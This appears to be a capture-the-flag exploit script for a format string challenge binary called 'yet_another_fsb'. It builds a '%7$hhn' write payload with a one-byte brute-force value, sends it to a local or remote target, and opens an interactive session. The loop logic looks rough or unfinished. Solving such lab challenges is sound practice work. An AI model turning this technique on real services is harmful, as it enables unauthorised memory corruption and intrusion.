#!/usr/bin/python3
from pwncus import *
from time import sleep

context.log_level = 'debug'
exe = context.binary = ELF('./yet_another_fsb', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

def GDB(): gdb.attach(p, gdbscript='''

b*main+67
c
''') if not args.REMOTE else None

if args.REMOTE:
    con = sys.argv[1:]
    p = remote(con[0], int(con[1]))
else:
    p = process(argv=[exe.path], aslr=False)
set_p(p)
if args.GDB: GDB(); input()

# ===========================================================
#                          EXPLOIT 
# ===========================================================

def exploit():

    pl = f"A%7$hhn".encode().ljust(0x8,b"A")
    brute = p8(0x30-2)
    pl += brute
    s(pl)

    interactive()

for i in range (16):
    exploit()

if __name__ == '__main__':
    exploit()
